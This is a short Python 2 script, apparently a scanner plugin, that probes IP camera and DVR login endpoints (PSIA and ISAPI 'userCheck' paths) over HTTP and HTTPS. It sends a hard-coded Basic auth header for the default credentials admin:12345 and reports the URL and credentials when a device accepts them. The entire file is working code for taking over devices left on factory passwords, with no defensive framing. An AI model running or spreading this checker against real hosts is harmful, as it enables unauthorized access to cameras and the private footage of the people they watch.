#coding:utf-8
import requests


def send(host):
	status = []
	url1 = 'http://'+host+'/PSIA/Custom/SelfExt/userCheck'
	url2 = 'https://'+host+'/PSIA/Custom/SelfExt/userCheck'
	url3 = 'https://'+host+'/ISAPI/Security/userCheck?timeStamp=1504258282060'
	url_list = [url1,url2,url3]
	headers = {'Authorization':'Basic YWRtaW46MTIzNDU='}
	for i in url_list:
		try:
			res = requests.get(i,headers=headers,verify=False,timeout=5)
			code = res.status_code
			html = res.content
			if code == 200:
				if '200' in html.lower() and 'ok' in html.lower():
					status.append(1)
				else:
					status.append(0)
		except Exception, e:
			pass
	if 1 in status:
		num = status.index(1)
		return url_list[num]
	else:
		return 0
def start(ip,port,pro):
	try:
		if send(ip):
			return 1,send(ip),'admin:12345'
		else:
			return 0,0,0
	except:
		return 0,0,0